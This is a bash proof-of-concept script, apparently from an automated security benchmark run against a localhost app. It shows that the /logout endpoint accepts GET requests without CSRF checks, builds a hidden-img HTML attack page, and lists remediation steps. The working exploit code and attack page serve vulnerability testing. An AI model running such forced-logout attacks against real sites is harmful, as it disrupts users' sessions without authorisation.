#!/bin/bash
# POC: Demonstrates CSRF vulnerability on /logout endpoint - shows that logout can be triggered via GET request without CSRF token protection
# Target: ./repo
# Created: 2025-11-05T17:02:30.498Z
# Session: benchmark-XBEN-032-24-mhm7iwy4

# CSRF Logout Endpoint POC
# Demonstrates that /logout endpoint is vulnerable to CSRF attacks
# Logout can be triggered via simple GET request without CSRF token protection

TARGET_URL="http://localhost"
LOGOUT_ENDPOINT="/logout"

echo "=========================================="
echo "CSRF Logout Endpoint Vulnerability POC"
echo "=========================================="
echo ""

# Step 1: Create a session by logging in
echo "[*] Step 1: Creating a session by logging in..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies.txt -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password")

echo "[+] Login attempt completed"
echo ""

# Step 2: Verify session was created
echo "[*] Step 2: Verifying session cookie exists..."
if grep -q "session" /tmp/cookies.txt; then
    echo "[+] Session cookie created successfully"
    cat /tmp/cookies.txt | grep session
else
    echo "[-] No session cookie found"
fi
echo ""

# Step 3: Test that logout endpoint accepts GET requests (no CSRF protection)
echo "[*] Step 3: Testing CSRF vulnerability - Triggering logout via GET request..."
LOGOUT_RESPONSE=$(curl -s -b /tmp/cookies.txt -i -X GET "$TARGET_URL$LOGOUT_ENDPOINT" 2>&1)

echo "[*] Response from GET $LOGOUT_ENDPOINT:"
echo "$LOGOUT_RESPONSE" | head -20
echo ""

# Step 4: Check if logout was successful (typically 302 redirect to login)
if echo "$LOGOUT_RESPONSE" | grep -q "302\|301"; then
    echo "[+] VULNERABLE: /logout accepts GET requests and responds with redirect"
    echo "[+] This indicates no CSRF token validation is performed"
elif echo "$LOGOUT_RESPONSE" | grep -q "200"; then
    echo "[+] VULNERABLE: /logout accepts GET requests and returns 200 OK"
fi
echo ""

# Step 5: Demonstrate CSRF attack - logout with arbitrary parameters (no validation)
echo "[*] Step 5: Testing CSRF attack with arbitrary parameters..."
echo "[*] Attempting logout with fake CSRF token (should work if no validation)..."

LOGIN_RESPONSE=$(curl -s -c /tmp/cookies2.txt -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password")

CSRF_ATTACK=$(curl -s -b /tmp/cookies2.txt -i -X GET "$TARGET_URL$LOGOUT_ENDPOINT?csrf_token=invalid_token_12345" 2>&1)

if echo "$CSRF_ATTACK" | grep -q "302\|301"; then
    echo "[+] VULNERABLE: Logout succeeds with invalid/fake CSRF token"
    echo "[+] This confirms no CSRF token validation is performed"
fi
echo ""

# Step 6: Create HTML POC that would trigger CSRF attack
echo "[*] Step 6: Creating HTML POC file for CSRF attack..."
cat > /tmp/csrf_attack.html << 'EOF'
<html>
<head>
    <title>Loading...</title>
</head>
<body>
    <h1>Please wait...</h1>
    <img src="http://localhost/logout" style="display:none;">
    <p>This page demonstrates CSRF attack on logout endpoint.</p>
    <p>If you were logged into localhost, you have been logged out.</p>
</body>
</html>
EOF

echo "[+] HTML POC created at /tmp/csrf_attack.html"
echo "[+] The HTML file embeds an img tag that triggers GET request to /logout"
echo ""

# Step 7: Demonstrate that multiple logout attempts work (no rate limiting on CSRF)
echo "[*] Step 7: Testing multiple CSRF logout attempts..."
LOGIN_RESPONSE=$(curl -s -c /tmp/cookies3.txt -X POST "$TARGET_URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=john&password=password")

SUCCESS_COUNT=0
for i in {1..3}; do
    LOGOUT_ATTEMPT=$(curl -s -b /tmp/cookies3.txt -X GET "$TARGET_URL$LOGOUT_ENDPOINT" 2>&1)
    if echo "$LOGOUT_ATTEMPT" | grep -q "302\|301\|200"; then
        SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
    fi
done

echo "[+] Successfully triggered logout $SUCCESS_COUNT/3 times without validation"
echo ""

# Step 8: Summary
echo "=========================================="
echo "POC Summary - CSRF Logout Vulnerability"
echo "=========================================="
echo "[+] VULNERABILITY CONFIRMED:"
echo "    - /logout endpoint accepts GET requests"
echo "    - No CSRF token validation is performed"
echo "    - No parameter validation exists"
echo "    - Attackers can force logout via simple image/link embedding"
echo "    - HTML POC created at /tmp/csrf_attack.html"
echo ""
echo "[*] Exploitation scenario:"
echo "    1. Attacker creates HTML page with <img src='http://localhost/logout'>"
echo "    2. Attacker tricks logged-in user into visiting that page"
echo "    3. User's browser automatically requests /logout via img tag"
echo "    4. User is forcefully logged out"
echo ""
echo "[*] Remediation:"
echo "    1. Change logout to POST-only method"
echo "    2. Implement CSRF token validation"
echo "    3. Add SameSite=Strict to session cookies"
echo "    4. Validate Referer/Origin headers"
echo "=========================================="

# Cleanup
rm -f /tmp/cookies.txt /tmp/cookies2.txt /tmp/cookies3.txt

exit 0